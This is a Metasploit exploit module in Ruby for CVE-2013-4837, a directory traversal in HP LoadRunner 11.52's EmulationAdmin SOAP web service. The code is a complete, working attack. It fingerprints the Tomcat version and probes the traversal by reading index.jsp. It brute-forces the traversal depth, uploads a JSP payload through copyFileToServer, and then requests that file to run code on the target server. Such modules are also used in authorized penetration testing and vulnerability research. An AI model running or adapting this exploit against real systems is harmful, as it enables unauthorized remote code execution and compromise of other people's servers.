require &#039;rexml/document&#039;
 
class Metasploit3 < Msf::Exploit::Remote
  Rank = ExcellentRanking
 
  HttpFingerprint = { :pattern => [ /Apache-Coyote\/1\.1/ ] }
 
  include REXML
  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::FileDropper
 
  def initialize(info = {})
    super(update_info(info,
      &#039;Name&#039;        => &#039;HP LoadRunner EmulationAdmin Web Service Directory Traversal&#039;,
      &#039;Description&#039; => %q{
        This module exploits a directory traversal vulnerability on the version 11.52 of HP
        LoadRunner. The vulnerability exists on the EmulationAdmin web service, specifically
        in the copyFileToServer method, allowing to upload arbitrary files. This module has
        been tested successfully on HP LoadRunner 11.52 over Windows 2003 SP2.
      },
      &#039;Author&#039;       =>
        [
          &#039;rgod <rgod[at]autistici.org>&#039;, # Vulnerability Discovery
          &#039;juan vazquez&#039; # Metasploit module
        ],
      &#039;License&#039;     => MSF_LICENSE,
      &#039;References&#039;  =>
        [
          [ &#039;CVE&#039;, &#039;2013-4837&#039; ],
          [ &#039;OSVDB&#039;, &#039;99231&#039; ],
          [ &#039;BID&#039;, &#039;63475&#039; ],
          [ &#039;ZDI&#039;, &#039;13-259&#039; ],
          [ &#039;URL&#039;, &#039;https://h20566.www2.hp.com/portal/site/hpsc/public/kb/docDisplay/?docId=emr_na-c03969437&#039; ]
        ],
      &#039;Privileged&#039;  => true,
      &#039;Platform&#039;    => &#039;win&#039;,
      &#039;Arch&#039;        => ARCH_JAVA,
      &#039;Targets&#039;     =>
        [
          [ &#039;HP LoadRunner 11.52&#039;, { } ],
        ],
      &#039;DefaultTarget&#039;  => 0,
      &#039;DisclosureDate&#039; => &#039;Oct 30 2013&#039;))
 
    register_options(
      [
        Opt::RPORT(8080),
        # By default files dropped into C:\windows\system32\null\
        OptInt.new(&#039;DEPTH&#039;, [ true, &#039;Traversal Depth (to reach the root folder)&#039;, 3 ]),
        # By default HP LoadRunner installed on C:\Program Files\HP\LoadRunner
        OptString.new(&#039;INSTALLPATH&#039;, [ true, &#039;HP LoadRunner Install Path (from the root folder)&#039;, "Program Files\\HP\\LoadRunner" ])
      ], self.class)
  end
 
  def get_soap_request(action, opts={})
    path_param     = opts[:path]
    contents_param = opts[:contents]
 
    se_name = &#039;&#039;
    case action
    when :upload
      se_name = &#039;ser:copyFileToServer&#039;
    when :read
      se_name = &#039;ser:getFileContentAsLines&#039;
    end
 
    xml = Document.new
    xml.add_element(
      "soapenv:Envelope",
      {
        &#039;xmlns:xsi&#039;     => "http://www.w3.org/2001/XMLSchema-instance",
        &#039;xmlns:xsd&#039;     => "http://www.w3.org/2001/XMLSchema",
        &#039;xmlns:soapenv&#039; => "http://schemas.xmlsoap.org/soap/envelope/",
        &#039;xmlns:ser&#039;     => "http://service.emulation.ws.mercury.com"
      })
    xml.root.add_element("soapenv:Header")
    xml.root.add_element("soapenv:Body")
    body = xml.root.elements[2]
    body.add_element(
      se_name,
      {
        &#039;soapenv:encodingStyle&#039; => "http://schemas.xmlsoap.org/soap/encoding/"
      })
    ser = body.elements[1]
    ser.add_element("in0", {&#039;xsi:type&#039; => &#039;xsd:int&#039;})
    ser.elements[&#039;in0&#039;].text = 30000 + rand(30000)
    ser.add_element("in1", {&#039;xsi:type&#039; => &#039;xsd:string&#039;})
    ser.elements[&#039;in1&#039;].text = path_param
 
    if action == :upload
      ser.add_element("in2", {&#039;xsi:type&#039; => "xsd:base64Binary"})
      ser.elements[&#039;in2&#039;].text = Rex::Text.encode_base64(contents_param)
    end
 
    xml.to_s
  end
 
  def check
    depth = datastore[&#039;DEPTH&#039;]
    install_path = datastore[&#039;INSTALLPATH&#039;]
 
    print_status("#{peer} - Detecting tomcat version...")
    tomcat_version = get_tomcat_version
 
    if tomcat_version
      print_status("#{peer} - Tomcat #{tomcat_version} detected... Verifying traversal...")
      location = ""
      location << install_path
      location << "\\" unless install_path.ends_with("\\") or install_path.ends_with("/")
      location << "apache-tomcat-#{tomcat_version}\\webapps\\ServiceEmulation"
 
      res = read_file(depth, location, "index.jsp")
 
      if res and res.code == 200  and res.body.to_s =~ /HP Service Emulation/
        print_good("#{peer} - Traversal exists and parameters are correct...")
        return Exploit::CheckCode::Vulnerable
      elsif res and res.code == 500 and res.body.to_s =~ /FileNotFoundException/
        print_warning("#{peer} - Traversal appears to exist, try adjusting parameters DEPTH and INSTALLPATH...")
        return Exploit::CheckCode::Appears
      else
        print_status("#{peer} - Failed to verify the directory traversal...")
      end
    else
      print_error("#{peer} - Tomcat version not detected...")
    end
 
    print_status("#{peer} - Checking if the vulnerable web service and method exist...")
    res = send_request_cgi({
      &#039;uri&#039;    => normalize_uri(&#039;ServiceEmulation&#039;, &#039;services&#039;, &#039;EmulationAdmin&#039;),
      &#039;vars_get&#039; => { &#039;wsdl&#039; => 1 }
    })
 
    if res and res.code == 200 and res.body.to_s =~ /wsdl.*EmulationAdmin/ and res.body.to_s =~ /copyFileToServerRequest/
      return Exploit::CheckCode::Detected
    end
 
    return Exploit::CheckCode::Safe
  end
 
  def exploit
    depth = datastore[&#039;DEPTH&#039;]
    install_path = datastore[&#039;INSTALLPATH&#039;]
 
    print_status("#{peer} - Retrieving the Tomcat version used...")
    tomcat_version = get_tomcat_version
 
    if tomcat_version.nil?
      fail_with(Failure::NoTarget, "#{peer} - Failed to retrieve the Tomcat version used")
    else
      print_good("#{peer} - Tomcat #{tomcat_version} found")
    end
 
    print_status("#{peer} - Verifying parameters to exploit the directory traversal...")
    brute_force = false
    location = ""
    location << install_path
    location << "\\" unless install_path.ends_with("\\") or install_path.ends_with("/")
    location << "apache-tomcat-#{tomcat_version}\\webapps\\ServiceEmulation"
 
    res = read_file(depth, location, "index.jsp")
 
    if res and res.code == 200  and res.body.to_s =~ /HP Service Emulation/
      print_good("#{peer} - Traversal parameters are correct")
    elsif res and res.code == 500 and res.body.to_s =~ /FileNotFoundException/
      print_error("#{peer} - Traversal parameters are incorrect, will try to brute force depth...")
      brute_force = true
    else
      fail_with(Failure::Unknown, "#{peer} - Unknown error while verifying the traversal parameters")
    end
 
    if brute_force
      print_status("#{peer} - Trying to brute force the traversal depth...")
      depth = brute_force_depth(location)
      if depth.nil?
        fail_with(Failure::BadConfig, "#{peer} - Traversal parameters are incorrect, try setting DEPTH and INSTALLPATH")
      end
      print_good("#{peer} - Using #{depth} as depth length to exploit the traversal...")
    end
 
    jsp_name = "#{rand_text_alphanumeric(4+rand(32-4))}.jsp"
 
    # It&#039;s uploading a JSP payload because AutoDeploy on the webapps directory isn&#039;t working on my tests
    print_status("#{peer} - Uploading the JSP payload...")
    res = upload_file(depth, location, jsp_name, payload.encoded)
 
    if res and res.code == 200 and res.body.to_s =~ /copyFileToServerResponse/ and res.body.to_s !~ /faultcode/
      print_status("#{peer} - JSP payload uploaded successfully")
      register_files_for_cleanup("..\\..\\#{location}\\#{jsp_name}")
    else
      fail_with(Failure::Unknown, "#{peer} - JSP payload upload failed")
    end
 
    print_status("#{peer} - Executing payload on #{normalize_uri(&#039;ServiceEmulation&#039;, &#039;services&#039;, &#039;EmulationAdmin&#039;, jsp_name)}...")
 
    send_request_cgi({
      &#039;uri&#039;    => normalize_uri(&#039;ServiceEmulation&#039;, jsp_name),
      &#039;method&#039; => &#039;GET&#039;
    }, 1)
  end
 
  def send_request_soap(soap_request)
    res = send_request_cgi({
      &#039;uri&#039;      => normalize_uri(target_uri.path, &#039;ServiceEmulation&#039;, &#039;services&#039;, &#039;EmulationAdmin&#039;),
      &#039;method&#039;   => &#039;POST&#039;,
      &#039;ctype&#039;    => &#039;text/xml; charset=UTF-8&#039;,
      &#039;data&#039;     => soap_request,
      &#039;headers&#039;  => {
        &#039;SOAPAction&#039;    => &#039;""&#039;,
      }
    })
 
    return res
  end
 
  def upload_file(traversal_depth, location, file_name, contents)
    path = "..\\" * traversal_depth
    path << location
    path << "\\" unless location[-1] == "/" or location[-1] == "\\"
    path << file_name
 
    req = get_soap_request(:upload, {:path => path, :contents => contents})
 
    return send_request_soap(req)
  end
 
  def read_file(traversal_depth, location, file_name)
    path = "..\\" * traversal_depth
    path << location
    path << "\\" unless location[-1] == "/" or location[-1] == "\\"
    path << file_name
 
    req = get_soap_request(:read, {:path => path})
 
    return send_request_soap(req)
  end
 
  def brute_force_depth(location)
    10.times do |i|
      res = read_file(i, location, "index.jsp")
 
      if res and res.code == 200  and res.body.to_s =~ /HP Service Emulation/
        return i
      end
    end
 
    return nil
  end
 
  def get_tomcat_version
    res = send_request_cgi({
      &#039;uri&#039; => normalize_uri(&#039;webdav&#039;)
    })
 
    if res and res.code == 200 and res.body.to_s =~ /Apache Tomcat\/([\d\.]+)/
      return $1
    end
 
    return nil
  end
 
end

